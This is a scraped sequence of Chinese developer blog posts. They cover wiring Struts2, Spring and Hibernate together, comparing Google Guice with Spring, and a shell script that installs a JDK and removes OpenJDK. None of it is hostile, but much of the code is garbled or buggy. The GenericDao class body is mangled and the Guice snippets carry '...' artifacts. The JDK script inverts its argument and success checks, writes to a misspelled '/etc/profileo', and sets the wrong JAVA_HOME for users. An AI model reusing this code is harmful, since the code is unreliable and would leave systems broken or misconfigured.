    class="org.springframework.orm.hibernate3.LocalSessionFactoryBean">
    <property name="dataSource">
        <ref local="dataSource" />
    </property>
    <property name="mappingResources">
        <list>
            <value>com/firstssh/model/User.hbm.xml</value>
        </list>
    </property>
    <property name="hibernateProperties">
        <props>
            <prop key="hibernate.dialect">${hibernate.dialect}</prop>
            <prop key="hibernate.show_sql">${hibernate.show_sql}</prop>
            <prop key="hibernate.jdbc.fetch_size">
                ${hibernate.jdbc.fetch_size}
            </prop>
            <prop key="hibernate.jdbc.batch_size">
                ${hibernate.jdbc.batch_size}
            </prop>
        </props>
    </property>
</bean>
<!-- 配置事务管理器bean,使用HibernateTransactionManager事务管理器 -->
<bean id="transactionManager"
    class="org.springframework.orm.hibernate3.HibernateTransactionManager">
        <!-- 为事务管理器注入sessionFactory" -->
        <property name="sessionFactory" ref="sessionFactory"/>
</bean>
<!-- 配置事务拦截器Bean -->
<bean id="transactionInterceptor"
    class="org.springframework.transaction.interceptor.TransactionInterceptor">
    <!-- 为事务拦截器bean注入一个事物管理器 -->
    <property name="transactionManager" ref="transactionManager"></property>
    <property name="transactionAttributes">
    <!-- 定义事务传播属性 -->
        <props>
                <prop key="insert*">PROPAGATION_REQUIRED</prop>
                <prop key="update*">PROPAGATION_REQUIRED</prop>
                <prop key="save*">PROPAGATION_REQUIRED</prop>
                <prop key="add*">PROPAGATION_REQUIRED</prop>
                <prop key="remove*">PROPAGATION_REQUIRED</prop>
                <prop key="delete*">PROPAGATION_REQUIRED</prop>
                <prop key="get*">PROPAGATION_REQUIRED,readOnly</prop>
                <prop key="find*">PROPAGATION_REQUIRED,readOnly</prop>
                <prop key="load*">PROPAGATION_REQUIRED,readOnly</prop>
                <prop key="change*">PROPAGATION_REQUIRED</prop>
                <prop key="*">PROPAGATION_REQUIRED,readOnly</prop>
        </props>
    </property>
</bean>
<!-- 定义BeanNameAutoProxyCreator -->
<bean class="org.springframework.aop.framework.autoproxy.BeanNameAutoProxyCreator">
    <!-- 指定满足哪些bean自动生成业务代理 -->
    <property name="beanNames">
    <!-- 需要自动创建事务代理的bean -->
        <list>
            <value>userService</value>
        </list>
        <!-- 其它需要自动创建事务代理的bean -->
    </property>
    <property name="interceptorNames">
        <list>
            <value>transactionInterceptor</value>
            <!-- 可增加其它的interceptor -->
        </list>
    </property>
</bean>
</beans>
applicationContext-dao.xml内容:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE beans PUBLIC "-//SPRING//DTD BEAN 2.0//EN" "http://www.springframework.org/dtd/spring-beans-2.0.dtd">
<beans>
<!-- 根DAO -->
<bean id="genericDao" class="com.firstssh.common.dao.GenericDao">
    <property name="sessionFactory">
        <ref bean="sessionFactory" />
    </property>
</bean>
<bean id="userDao" class="com.firstssh.dao.impl.UserDao" parent="genericDao" />
</beans>
 applicationContext-service.xml内容:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE beans PUBLIC "-//SPRING//DTD BEAN 2.0//EN" "http://www.springframework.org/dtd/spring-beans-2.0.dtd">
<beans>
<bean id="userService" class="com.firstssh.service.impl.UserService">
    <property name="userDao">
        <ref bean="userDao"/>
    </property>
</bean>
<bean id="validateName" class="com.firstssh.common.Bean.ValidateName">
    <property name="userService">
        <ref local="userService"/>
    </property>
</bean>
</beans>
 action-servlet.xml内容:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE beans PUBLIC "-//SPRING//DTD BEAN 2.0//EN" "http://www.springframework.org/dtd/spring-beans-2.0.dtd">
<beans>
    <bean id="LoginAction" class="com.firstssh.action.LoginAction"
        scope="prototype">
        <property name="userService" ref="userService" />
    </bean>
    <bean id="RegistAction" class="com.firstssh.action.RegistAction"
        scope="prototype">
        <property name="userService" ref="userService" />
    </bean>
</beans>
 以上几个xml文件的内容暂且不要理会，继续往下看，你就自动明白的，不用我解释。 4）日志部分:log4j.properties 、commons-logging.properties log4j.properties内容:
# For JBoss: Avoid to setup Log4J outside $JBOSS_HOME/server/default/deploy/log4j.xml!
# For all other servers: Comment out the Log4J listener in web.xml to activate Log4J.
log4j.rootLogger=INFO, stdout, logfile
log4j.appender.stdout=org.apache.log4j.ConsoleAppender
log4j.appender.stdout.layout=org.apache.log4j.PatternLayout
log4j.appender.stdout.layout.ConversionPattern=%d %p [%c] - %m%n
log4j.appender.logfile=org.apache.log4j.RollingFileAppender
log4j.appender.logfile.File=${firstssh.root}/WEB-INF/logs/firstssh.log
log4j.appender.logfile.MaxFileSize=512KB
# Keep three backup files.
log4j.appender.logfile.MaxBackupIndex=3
# Pattern to output: date priority [category] - message
log4j.appender.logfile.layout=org.apache.log4j.PatternLayout
log4j.appender.logfile.layout.ConversionPattern=%d %p [%c] - %m%n
# OpenSymphony Stuff
log4j.logger.com.opensymphony=INFO
log4j.logger.org.apache.struts2=INFO
# Spring Stuff
log4j.logger.org.springframework=INFO
# Hibernate Stuff
log4j.logger.org.hiberante=INFO
commons-logging.properties 内容:
org.apache.commons.logging.Log = org.apache.commons.logging.impl.Log4JLogger
 5)web.xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://java.sun.com/xml/ns/j2ee" 
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
 xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd" 
 version="2.4">
 <display-name>firstssh</display-name>
 <description>this is a simple example</description>
 <context-param>
  <param-name>webAppRootKey</param-name>
  <param-value>firstssh.root</param-value>
 </context-param>
 
 <context-param>
  <param-name>contextConfigLocation</param-name>
  <param-value>/WEB-INF/applicationContext-*.xml,/WEB-INF/action-servlet.xml</param-value>
 </context-param>
 <context-param>
  <param-name>log4jConfigLocation</param-name>
  <param-value>/WEB-INF/log4j.properties</param-value>
 </context-param>
 <listener>
  <listener-class>org.springframework.web.util.Log4jConfigListener</listener-class>
 </listener>
 <!-- 用于初始化Spring容器的Listener -->
    <listener>
        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
    </listener>
 
 
 <!-- 定义整合SiteMesh必须的ActionContextCleanUp Filter 
 <filter>
  <filter-name>struts-cleanup</filter-name>
  <filter-class>org.apache.struts2.dispatcher.ActionContextCleanUp</filter-class>
 </filter>-->
 <!-- 定义Struts2的FilterDispathcer的Filter -->
    <filter>
        <filter-name>struts2</filter-name>
        <filter-class>org.apache.struts2.dispatcher.FilterDispatcher</filter-class>
    </filter>
   <!--   <filter-mapping>
        <filter-name>struts-cleanup</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>-->
 <!-- FilterDispatcher用来初始化struts2并且处理所有的WEB请求。 -->
    <filter-mapping>
        <filter-name>struts2</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
    
   <!-- 这是一个产生验证码的servlet -->
    <servlet>
        <servlet-name>img</servlet-name>
        <servlet-class>com.firstssh.servlet.AuthImg</servlet-class>
    </servlet>
  
    <servlet-mapping>
        <servlet-name>img</servlet-name>
     <url-pattern>/authImg</url-pattern>
    </servlet-mapping>
    <filter>   
        <filter-name>encodingFilter</filter-name>   
        <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>   
        <init-param>   
            <param-name>encoding</param-name>   
            <param-value>utf-8</param-value>   
        </init-param>   
    </filter>   
    <filter-mapping>   
        <filter-name>encodingFilter</filter-name>   
        <url-pattern>*.action</url-pattern>   
    </filter-mapping>   
    <filter-mapping>   
        <filter-name>encodingFilter</filter-name>   
        <url-pattern>*.jsp</url-pattern>   
    </filter-mapping>
    <filter>   
        <filter-name>hibernateFilter</filter-name>   
        <filter-class>org.springframework.orm.hibernate3.support.OpenSessionInViewFilter</filter-class>   
    </filter> 
    <filter-mapping>   
        <filter-name>hibernateFilter</filter-name>   
        <url-pattern>*.action</url-pattern>   
    </filter-mapping> 
    
    <!-- DWR Servlet-->
  <servlet>
    <servlet-name>dwr-invoker</servlet-name>
    <servlet-class>org.directwebremoting.servlet.DwrServlet</servlet-class>
    <init-param>
      <param-name>debug</param-name>
      <param-value>true</param-value>
    </init-param>
  </servlet>
  <servlet-mapping>
    <servlet-name>dwr-invoker</servlet-name>
    <url-pattern>/dwr/*</url-pattern>
  </servlet-mapping>
  
    <session-config>   
        <session-timeout>10</session-timeout>   
    </session-config> 
    
  <welcome-file-list>
    <welcome-file>index.jsp</welcome-file>
  </welcome-file-list>
  <error-page>
    <error-code>401</error-code>
    <location>/401.htm</location>
  </error-page>
  <error-page>
    <error-code>403</error-code>
    <location>/403.htm</location>
  </error-page>
  <error-page>
    <error-code>404</error-code>
    <location>/404.htm</location>
  </error-page>
  <error-page>
    <error-code>500</error-code>
    <location>/500.htm</location>
  </error-page>
</web-app>
 
6)dwr.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE dwr PUBLIC "-//GetAhead Limited//DTD Direct Web Remoting 2.0//EN" "http://getahead.org/dwr/dwr20.dtd">
<dwr>
    <!-- 检查用户名是否存在 ValidateName的映射文件-->
    <allow>
      <create  creator="spring" javascript="ValidateName" >
          <param name="beanName" value="validateName"/>
          <include method="valid"/>
      </create>
     </allow>
</dwr>
三、 开始编码: 以下是DAO部分的核心代码: IGenericDao.java内容如下:
/** 
 *
 * @author <a href="mailto:flustar2008@163.com">flustar</a>
 * @version 1.0 
 * Creation date: Dec 23, 2007 6:19:21 PM
 */
 package com.firstssh.common.dao;
 import java.io.Serializable;
 import java.util.Collection;
 import java.util.List;
 import org.hibernate.LockMode;
 import org.hibernate.criterion.DetachedCriteria;
 import org.springframework.dao.DataAccessException;
 import com.firstssh.common.util.PaginationSupport;
 public interface IGenericDao <T, ID extends Serializable> {
 public T load(ID id) throws DataAccessException;
 public T get(ID id)throws DataAccessException;
 public boolean contains(T t) throws DataAccessException;
 public void refresh(T t, LockMode lockMode) throws DataAccessException;
 public void refresh(T t) throws DataAccessException;
 public Serializable save(T t) throws DataAccessException;
 public void saveOrUpdate(T t) throws DataAccessException;
 public void saveOrUpdateAll(Collection<T> entities)
 throws DataAccessException;
 public void update(T t, LockMode lockMode) throws DataAccessException;
 public void update(T t) throws DataAccessException;
 public void delete(T t, LockMode lockMode) throws DataAccessException;
 public void delete(T t) throws DataAccessException;
 public void deleteAll(Collection<T> entities) throws DataAccessException;
 public List<T> find(String queryString, Object value)
 throws DataAccessException;
 public List<T> find(String queryString, Object[] values)
 throws DataAccessException;
 public List<T> find(String queryString) throws DataAccessException;
 public List<T> list()throws DataAccessException;
 
 public List<T> findByNamedQuery(String queryName)throws DataAccessException ;
 
 public List<T> findByNamedQuery(String queryName, Object value)throws DataAccessException ;
 
 public List<T> findByNamedQuery(String queryName, Object[] values)throws DataAccessException ;
 
 public PaginationSupport findPageByCriteria(
 final DetachedCriteria detachedCriteria, final int pageSize,
 final int startIndex);
 public PaginationSupport findPageByQuery(final String hql,
 final String countHql, final int pageSize, final int startIndex);
}
 GenericDao.java内容如下:
 /** 
 *
 * @author <a href="mailto:flustar2008@163.com">flustar</a>
 * @version 1.0 
 * Creation date: Dec 23, 2007 11:23:56 PM
 */
 package com.firstssh.common.dao;
 import java.io.Serializable;
 import java.lang.reflect.ParameterizedType;
 import java.sql.SQLException;
 import java.util.Collection;
 import java.util.List;
 import org.apache.commons.logging.Log;
 import org.apache.commons.logging.LogFactory;
 import org.hibernate.Criteria;
 import org.hibernate.HibernateException;
 import org.hibernate.LockMode;
 import org.hibernate.Query;
 import org.hibernate.Session;
 import org.hibernate.criterion.DetachedCriteria;
 import org.hibernate.criterion.Projections;
 import org.springframework.dao.DataAccessException;
 import org.springframework.orm.hibernate3.HibernateCallback;
 import org.springframework.orm.hibernate3.support.HibernateDaoSupport;
 import com.firstssh.common.util.PaginationSupport;
@SuppressWarnings( " unchecked " )
 public class GenericDao <T, ID extends Serializable> extends HibernateDaoSupport
 implements IGenericDao <T, ID> ];
 logger.debug("T class=" + entityClass.getName());
 }
 return entityClass;
 }
 public void saveOrUpdate(T t) throws DataAccessException {
 this.getHibernateTemplate().saveOrUpdate(t);
 }
 public T load(ID id) throws DataAccessException {
 T load=(T) getHibernateTemplate().load(getEntityClass(), id);
 return load;
 }
 public T get(ID id) throws DataAccessException {
 T load=(T) getHibernateTemplate().get(getEntityClass(), id);
 return load;
 }
 public boolean contains(T t) throws DataAccessException {
 return getHibernateTemplate().contains(t);
 }
 public void delete(T t, LockMode lockMode) throws DataAccessException {
 getHibernateTemplate().delete(t, lockMode);
 }
 public void delete(T t) throws DataAccessException {
 getHibernateTemplate().delete(t);
 }
 public void deleteAll(Collection<T> entities) throws DataAccessException {
 getHibernateTemplate().deleteAll(entities);
 }
 public List<T> find(String queryString, Object value)
 throws DataAccessException {
 List<T> find=(List<T>) getHibernateTemplate()
 .find(queryString, value);
 return find;
 }
 public List<T> find(String queryString, Object[] values)
 throws DataAccessException {
 List<T> find=(List<T>) getHibernateTemplate().find(queryString,
 values);
 return find;
 }
 public List<T> find(String queryString) throws DataAccessException {
 return (List<T>) getHibernateTemplate().find(queryString);
 }
 public void refresh(T t, LockMode lockMode) throws DataAccessException {
 getHibernateTemplate().refresh(t, lockMode);
 }
 public void refresh(T t) throws DataAccessException {
 getHibernateTemplate().refresh(t);
 }
 public Serializable save(T t) throws DataAccessException {
 return getHibernateTemplate().save(t);
 }
 public void saveOrUpdateAll(Collection<T> entities)
 throws DataAccessException {
 getHibernateTemplate().saveOrUpdateAll(entities);
 }
 public void update(T t, LockMode lockMode) throws DataAccessException {
 getHibernateTemplate().update(t, lockMode);
 }
 public void update(T t) throws DataAccessException {
 getHibernateTemplate().update(t);
 }
 public List<T> list() throws DataAccessException {
 return getHibernateTemplate().loadAll(getEntityClass());
 }
 public List<T> findByNamedQuery(String queryName)
 throws DataAccessException {
 return getHibernateTemplate().findByNamedQuery(queryName);
 }
 public List<T> findByNamedQuery(String queryName, Object value)
 throws DataAccessException {
 return getHibernateTemplate().findByNamedQuery(queryName, value);
 }
 public List<T> findByNamedQuery(String queryName, Object[] values)
 throws DataAccessException {
 return getHibernateTemplate().findByNamedQuery(queryName, values);
 }
 public PaginationSupport findPageByCriteria(
 final DetachedCriteria detachedCriteria, final int pageSize,
 final int startIndex) {
 return (PaginationSupport) getHibernateTemplate().execute(
 new HibernateCallback() {
 public Object doInHibernate(Session session)
 throws HibernateException {
 Criteria criteria=detachedCriteria
 .getExecutableCriteria(session);
 int totalCount=((Integer) criteria.setProjection(
 Projections.rowCount()).uniqueResult())
 .intValue();
 criteria.setProjection(null);
 List items=criteria.setFirstResult(startIndex)
 .setMaxResults(pageSize).list();
 PaginationSupport ps=new PaginationSupport(items,
 totalCount, pageSize, startIndex);
 return ps;
 }
 }, true);
 }
 public PaginationSupport findPageByQuery( final String hql, final String countHql,final int pageSize,final int startIndex){ 
 return (PaginationSupport)getHibernateTemplate().execute( 
 new HibernateCallback() { 
 public Object doInHibernate(Session session) throws HibernateException, SQLException { 
 int totalCount=((Integer)session.createQuery(countHql).iterate().next()).intValue(); 
 Query query= session.createQuery(hql);
 query.setFirstResult(startIndex); 
 query.setMaxResults(pageSize); 
 List items=query.list();
 PaginationSupport ps=new PaginationSupport(items,
 totalCount, pageSize, startIndex);
 return ps;
 
 } 
 },true); 
 }
}
 呵呵，使用了泛型,以后每建立一个Dao都要建立相应的dao接口和实现类，如本例中的IUserDao和UserDao。
/** 
 *
 * @author <a href="mailto:flustar2008@163.com">flustar</a>
 * @version 1.0 
 * Creation date: Dec 24, 2007 12:47:57 AM
 */
package com.firstssh.dao;
import java.util.List;
import com.firstssh.common.dao.IGenericDao;
import com.firstssh.model.User;
public interface IUserDao extends IGenericDao<User, Integer> {
    
    public User getUserByName(String username);
    public List<User> findAllUser();
    public User findUserByNameAndPass(String username, String password);
} 
/** 
 *
 * @author <a href="mailto:flustar2008@163.com">flustar</a>
 * @version 1.0 
 * Creation date: Dec 24, 2007 12:38:48 AM
 */
package com.firstssh.dao.impl;
import java.util.List;
import com.firstssh.common.dao.GenericDao;
import com.firstssh.dao.IUserDao;
import com.firstssh.model.User;
public class UserDao extends GenericDao<User,Integer> implements IUserDao{
    public List<User> findAllUser() {
        
        return (List<User>)find("from User");
    }
    public User findUserByNameAndPass(String username, String password) {
        Object[] params=new Object[]{username,password};
        List<User> userList=find("from User as user where user.username=? and user.password=? ",params);
        if(userList!=null&&userList.size()>=1){
            return userList.get(0);
        }
        return null;
    }
    public User getUserByName(String username) {
        List<User> userList=find("from User as user where user.username=?",username);
        if(userList!=null&&userList.size()>=1){
            return userList.get(0);
        }
        return null;
    }
}
 还有好多文件的代码没有贴出来，我实在不忍心再复制、粘贴下去了（浪费大家那么多时间）,有兴趣的可以下载这个例子的源代码（由于这个例子牵涉的jar包比较大我就不把它们放进去了），我想以上这些文件的内容我就不用解释了，因为大家都学过SSH。本人初次整合它们，并没有使用这个整合方案做过项目，一定还有某些方面考虑的还不是太成熟，哪位大侠看了，还请多多批评指正，也希望谁有更好的整合方案，也共享一下，大家共同进步，共同提高！～^_^
已有 3 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
超轻量级DI容器框架Google Guice与Spring框架的区别教程详解及其demo代码片段分享, lizhuangs.iteye.com.blog.2056466, Tue, 29 Apr 2014 09:26:59 +0800

原创不易，转载请注明出处：超轻量级DI容器框架Google Guice与Spring框架的区别教程详解及其demo代码片段分享
代码下载地址：http://www.zuidaima.com/share/1759689106541568.htm
依赖注入，DI（Dependency Injection），它的作用自然不必多说，提及DI容器，例如spring，picoContainer，EJB容器等等，近日，google诞生了更轻巧的DI容器……Guice! 废话不多讲了，先看看Guice是如何实现注入的吧。 定义一个简单的service接口和它的实现吧：
package com.zuidaima.demo.guice;
public interface MyService ... {
 void myMethod();
}
package com.zuidaima.demo.guice;
 public class MyServiceImpl implements MyService ... {
 public void myMethod() ...{
 System.out.println("Hello,World!");
 }
}
以上是最普通的接口和其实现，没什么可说的。 定义一个测试类,这个类里边包括service对象的一个引用，这个对象是需要Guice进行注入的
package com.zuidaima.demo.guice;
import com.google.inject.Inject;
 public class Client ... {
 MyService service;
 @Inject //告诉容器，这里的service对象的引用,需要进行注入
 void setService(MyService service) ...{ //这里的方法名字可以任意定义
 this.service=service;
 }
 public void myMethod() ...{
 service.myMethod();
 }
}
 
这里除了加了一个@Inject,和Spring的配置没有任何的区别，@Inject，是表示对容器说，这里的service需要注射，等到运行的时候，容器会拿来一个实例给service，完成注射的过程。
定义Guice的Module文件 告诉容器如何进行注入
package com.zuidaima.demo.guice;
import com.google.inject.Binder;
 import com.google.inject.Module;
 import com.google.inject.Scopes;
 public class MyModule implements Module ... {
 public void configure(Binder binder) ...{ binder.bind(MyService.class).to(MyServiceImpl.class).in(Scopes.SINGLETON);
 // 这句代码的意思是说：运行时动态的将MyServiceImpl对象赋给MyService定义的对象，而且这个对象是单例的。
 }
}
 
创建测试类
package com.zuidaima.demo.guice;
import com.google.inject.Guice;
import com.google.inject.Injector;
 public class Test ... {
 public static void main(String[] args) ...{
MyModule module=new MyModule();// 定义注射规则
Injector injector=Guice.createInjector(module);// 根据注射规则，生成注射者
 Client client=new Client();
injector.injectMembers(client);// 注射者将需要注射的bean,按照规则,把client这个客户端进行注射
 client.myMethod(); 
}
}
 
运行测试类，控制台输出：Hello,World! 完成注入过程
下面看看Guice还有哪些其它的使用特性。 1，如果在实现你确定MyService定义的对象，就要被注射为MyServiceImpl而不是其它的实现类的话，可以在MyService接口加上@ImplementedBy(MyServiceImpl.class)
package com.zuidaima.demo.guice;
import com.google.inject.ImplementedBy;
@ImplementedBy(MyServiceImpl. class )
 // 我总觉得这样有点背离了依赖注入的初衷了? 
 public interface MyService ... {
 void myMethod();
}
 
这样的话，在MyModule里的configure方法中就可以不加任何东西，容器就会自动注射给MyServiceImpl对象。
2，可以对Field进行注解式注入 在Client.java中也可以把这个@Inject标注在MyService  service;的前边，如：@Inject MyService service;
 3，可使用自定义Annotation标注。
package com.zuidaima.demo.guice;
 import java.lang.annotation.ElementType;
 import java.lang.annotation.Retention;
 import java.lang.annotation.RetentionPolicy;
 import java.lang.annotation.Target;
 import com.google.inject.BindingAnnotation;
@Retention(RetentionPolicy.RUNTIME)
@Target( ... { ElementType.FIELD, ElementType.PARAMETER })
@BindingAnnotation
 public @ interface MyInterface ... {
 
}
 
那么Client.java需要改为
 
package com.zuidaima.demo.guice;
 import com.google.inject.Inject;
 public class Client ... {
 @Inject @MyInterface MyService service;
 
 void setService(MyService service) ...{ // 这里的方法名字可以任意定义
 this.service=service;
 }
 public void myMethod() ...{
 service.myMethod();
 }
}
 
MyModule.java中的configure方法内容需改为:
binder.bind(MyService.class).annotatedWith(MyInterface.class).to(     MyServiceImpl.class).in(Scopes.SINGLETON); 意思是说对于标注为MyInterface的MyService定义的对象进行注入
进行Annotation标注的成员（Field,method,argument等）进行自定义Annotation标注，该成员既拥有该属性，可以在运行，根据这些成员的不同属性，做一些不同的事情? 例如：spring的AspectJ，xdoclet等都是如此。
下边是我做了一下对比
Guice与Spring的对比
 
Spring
Guice
使用XML
使用将类与类之间的关系隔离到xml中，由容器负责注入被调用的对象，因此叫做依赖注入
不使用xml,将类与类之间的关系隔离到Module中，声名何处需要注入，由容器根据Module里的描述，注入被调用的对象。
使用Annotation
 
使用 支持自定义Annotation标注，对于相同的接口定义的对象引用，为它们标注上不同的自定义Annotation注释，就可以达到同一个类里边的同一个接口的引用，注射给不同的实现，在Module里用标注做区分，灵活性大大增加。 使用Annotation也未必是好事，范型等新特性也未必是好事，目前大多的服务器均不支持jdk1.5,wls要9以前才支持，而目前的客户由于价格原因也很少选用wls9的，至少我们做过的项目中都没有。功能再强，客户不需要，何用？
运行效率
装载spring配置文件时，需解析xml，效率低，getBean效率也不高，不过使用环境不会涉及到getBean，只有生产环境的时候会用到getBean,在装载spring应用程序的时候，已经完成全部的注射，所以这个低效率的问题不是问题。
使用Annotation，cglib, 效率高与spring最明显的一个区别，spring是在装载spring配置文件的时候把该注入的地方都注入完，而Guice呢，则是在使用的时候去注射，运行效率和灵活性高。
类耦合度
耦合度低，强调类非侵入，以外部化的方式处理依赖关系，类里边是很干净的，在配置文件里做文章，对类的依赖性极低。
高，代码级的标注，DI标记@inject侵入代码中，耦合到了类层面上来，何止侵入，简直侵略，代码耦合了过多guice的东西，大大背离了依赖注入的初衷，对于代码的可维护性，可读性均不利
类编写时
需要编写xml，配置Bean，配置注入
只需声明为@inject,等着被注入， 最后在统一的Module里声明注入方式
仅支持IOC
否，spring目前已经涉猎很多部分
是，目前仅仅是个DI容器
是否易于代码重构
统一的xml配置入口，更改容易
配置工作是在Module里进行，和spring异曲同功
支持多种注入方式
构造器，setter方法
Field,构造器，setter方法
灵活性
 
1,如果同一个接口定义的引用需要注入不同的实现，就要编写不同的Module，烦琐
2,动态注入
如果你想注射的一个实现，你还未知呢，怎么办呢，spring是没办法，事先在配置文件里写死的，而Guice就可以做到，就是说我想注射的这个对象我还不知道注射给谁呢，是在运行时才能得到的的这个接口的实现，所以这就大大提高了依赖注射的灵活性，动态注射。
与现有框架集成度
1， 高，众多现有优秀的框架（如struts1.x等）均提供了spring的集成入口，而且spring已经不仅仅是依赖注入，包括众多方面。 2， Spring也提供了对Hibernate等的集成，可大大简化开发难度。 3， 提供对于orm,rmi,webservice等等接口众多，体系庞大。
1，可以与现有框架集成，不过仅仅依靠一个效率稍高的DI，就想取代spring的地位，有点难度。
配置复杂度
在xml中定位类与类之间的关系,难度低
代码级定位类与类之间的关系,难度稍高
 
 再借斧子的例子说一说spring与guice的区别 看下边对于不同社会形态下一个人（java对象，调用者）需要一把斧子（java对象，被调用者）的例子： （1），原始社会时，劳动社会基本没有分工，需要斧子的人（调用者）只好自己去磨一把斧子，每个人拥有自己的斧子，如果把大家的石斧改为铁斧，需要每个人都要学会磨铁斧的本领，工作效率极低。 对应Java里的情形是：java程序里的调用者new一个被调用者的实例。类耦合度极高，修改维护烦琐，效率极低。 （2），工业社会时，工厂出现，斧子不再由普通人完成，而由工厂生产，当人们需要斧子的时候，可以到工厂购买斧子，无需关心斧子是怎么制造出来的，如果废弃铁斧为钢斧，只需改变工厂的制造工艺即可，制作工艺是工厂决定的，工厂生产什么斧子，工人们就得用什么斧子。  对应的Java里的情形是：Java程序的调用者可以以来简单工厂创建被调用者，变化点被隔离到了简单工厂里，虽然耦合度降低，但是调用者会和工厂耦合，而且需要定位自己的工厂。 （3）近代工业社会，工厂蓬勃发展，人们需要什么斧子，只需要提供一个斧子图形，商家会按照你提供的图形将你的斧子订做好，送上门。 对应Java里的情形：spring的依赖注入 （4）进入按需要分配社会，信息进入现代化，人们不再去工厂购买斧子，不再拘泥于需要什么斧子事先画好什么样的图形，只需要打个电话，描述一下需要什么类型的斧子，或许想打造一个物美价廉的斧子，商家会根据市场零件的价格，计算出最优制作工艺,打造最适合的斧子送过来，更加信息化，更加人性化。  对应Java里的情形：基于描述的注入，动态的，灵活简单的注入，如：Guice。   对于该不该使用Guice,我想也是仁者见仁,智者见智,就象好多论坛里动不动有人会在那里讨论到底学Java还是学.net或者是使用eclipse还是Jbuilder的这类无聊话题,适合和满足项目需求的,又能省工省力简单的完成工作的,就是最好的。
在此抛砖引玉,大家有异议的地方欢迎和我讨论。
已有 3 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Shell脚本 一键安装JDK, futeng.iteye.com.blog.2064143, Fri, 09 May 2014 01:02:17 +0800

背景
最近面对十几台“嗷嗷待配”JDK环境的机器，实在不想一个个配。生命如此美好，怎能浪费在无聊的重复劳动上，遂编写了个一键安装JDK的Shell脚本。脚本很简单，而且对于简单的环境配置也很实用。完整的代码贴在下面，希望也能帮助大家减轻工作量。
单步安装，移步这里
需求
能自动检测可能默认安装的openJDK，并能删除之。
能自动配置JDK在 /etc/profile的环境。
可携带参数，参数为普通用户名，可将JDK相关配置进普通用户的 .bash_profile环境。
一键安装脚本
脚本即安装文件已经备份到云端，请戳
installJDK.sh
 
#!/bin/bash
# shell script to install jdk (default version jdk-6u45-linux-x64.bin)
# example : ./installJDK.sh  or ./installJDK.sh newLinuxUsername
# version 1.0 
# created by ifuteng@gmail.com 2014/5/7
# 1. remove openjdk if exists.
for i in $(rpm -qa | grep jdk | grep -v grep)
do
  echo "Deleting rpm -> "$i
  rpm -e --nodeps $i
done
if [[ ! -z $(rpm -qa | grep jdk | grep -v grep) ]];
then 
  echo "-->Failed to remove the defult Jdk."
else 
  # 2.unzip and install JDK(jdk-6u45-linux-x64.bin)
  chmod u+x ./jdk-6u45-linux-x64.bin
  ./jdk-6u45-linux-x64.bin
  mkdir /usr/java
  mv ./jdk1.6.0_45 /usr/java/jdk1.6.0_45
  rm -rf ./jdk1.6.0_45
  
  
  # 3. config /etc/profile
  cp /etc/profile /etc/profile.beforeAddJDKenv.20140507.bak
  echo "JAVA_HOME=/usr/java/jdk1.6.0_45" >> /etc/profile
  echo "CLASSPATH=.:$JAVA_HOME/lib.tools.jar" >> /etc/profile
  echo "PATH=$JAVA_HOME/bin:$PATH" >> /etc/profile
  echo "export JAVA_HOME CLASSPATH PATH" >> /etc/profileo 
  echo "CLASSPATH=.:$JAVA_HOME/lib.tools.jar" >> /etc/profile
  echo "PATH=$JAVA_HOME/bin:$PATH" >> /etc/profile
  echo "export JAVA_HOME CLASSPATH PATH" >> /etc/profile
  
  #echo "-->JDK environment has been successed set in /etc/profile."
  # 4. config user's .bash_profile
  if [[  -z "$1" ]] ;
  then 
    #echo "-->Config .bash_profile for JDK environment from $1"
    username=$1
    user_bash_file=/home/$username/.bash_profile
    
    #cp $user_bash_file user_bash_file.beforeAddJDKenv.20140507.bak
    cp /home/$username/.bash_profile /home/$username/.bash_profile.beforeAddJDKenv.20140507.bak
    echo "export JAVA_HOME=/usr/share/jdk1.6.0_20" >> $user_bash_file
    echo "export PATH=$JAVA_HOME/bin:$PATH" >> $user_bash_file
    echo "export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar" >> $user_bash_file
  fi
  # 5. Test JDK evironment
  if [[ ! -z $(ls /user/java/jdk1.6.0_45) ]];
  then
    echo "-->Failed to install JDK (jdk-6u45-linux-x64 : /usr/java/jdk1.6.0_45)"
  else 
    echo "-->JDK has been successed installed."
    echo "java -version"
    java -version
    echo "javac -version"
    javac -version
    echo "ls \$JAVA_HOME"$JAVA_HOME
    ls $JAVA_HOME
  fi
fi
 
使用脚本
因为只求简单的实现，所以并为花时间考虑潜在的各种异常。默认使用jdk-6u45-linux-x64.bin(当然替换也异常方便)，注意脚本和安装文件需要放在同个目录下。将脚本粘贴到任意文本工具，选择jdk-6u45-linux-x64.bin，全部替换为你的JDK版本即可。
使用示例
# 不带参数
 ./installJDK.sh 
# 参数为普通用户名
 ./installJDK.sh newLinuxUsername
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Linux下安装JDK（删除openjdk）, futeng.iteye.com.blog.2064138, Fri, 09 May 2014 00:31:59 +0800

1. 查询是否默认安装有JDK
 
[root@CRXJ-APP-2 bin]# java -version
java version "1.6.0_22"
OpenJDK Runtime Environment (IcedTea6 1.10.4) (rhel-1.41.1.10.4.el6-x86_64)
OpenJDK 64-Bit Server VM (build 20.0-b11, mixed mode)
 
 
2. 删除默认的安装的OpenJdk
 
[root@CRXJ-APP-2 bin]# rpm -qa | grep jdk
java-1.6.0-openjdk-javadoc-1.6.0.0-1.41.1.10.4.el6.x86_64
java-1.6.0-openjdk-1.6.0.0-1.41.1.10.4.el6.x86_64
java-1.6.0-openjdk-devel-1.6.0.0-1.41.1.10.4.el6.x86_64
